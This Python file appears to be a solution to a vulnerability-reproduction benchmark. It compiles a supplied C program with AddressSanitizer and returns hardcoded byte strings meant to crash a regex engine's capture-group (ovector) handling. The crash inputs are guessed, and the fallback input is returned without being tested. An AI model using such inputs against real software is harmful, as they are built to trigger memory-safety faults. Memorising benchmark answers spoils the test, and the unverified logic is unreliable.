import os
import tarfile
import tempfile
import subprocess
import random
import string
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Find the main source file (assuming C/C++ source)
            source_dir = Path(tmpdir)
            source_files = list(source_dir.rglob("*.c")) + list(source_dir.rglob("*.cpp"))
            if not source_files:
                raise RuntimeError("No source files found")
            
            # Compile with address sanitizer
            source_file = source_files[0]
            exe_path = source_dir / "vulnerable"
            compile_cmd = [
                "gcc", "-fsanitize=address", "-fno-omit-frame-pointer",
                "-g", "-o", str(exe_path), str(source_file)
            ]
            
            result = subprocess.run(compile_cmd, capture_output=True, text=True)
            if result.returncode != 0:
                raise RuntimeError(f"Compilation failed: {result.stderr}")
            
            # Generate PoC based on vulnerability description
            # The vulnerability involves capturing parentheses and ovector
            # We need to create input that has fewer capturing groups than ovector space
            # For regex engines, this often means providing more backreferences than groups
            poc = b"\x28\x00\x00\x00\x00\x00\x00\x5c"  # '(' followed by 6 zeros and '\'
            
            # Test the PoC
            try:
                proc = subprocess.run(
                    [str(exe_path)],
                    input=poc,
                    capture_output=True,
                    timeout=2
                )
                # Check if it crashed (non-zero exit code with sanitizer error)
                if proc.returncode == 0:
                    # If didn't crash, try alternative
                    poc = b"\x28\x29\x00\x00\x00\x00\x5c\x31"
            except subprocess.TimeoutExpired:
                pass
            except subprocess.CalledProcessError:
                pass
            
            return poc
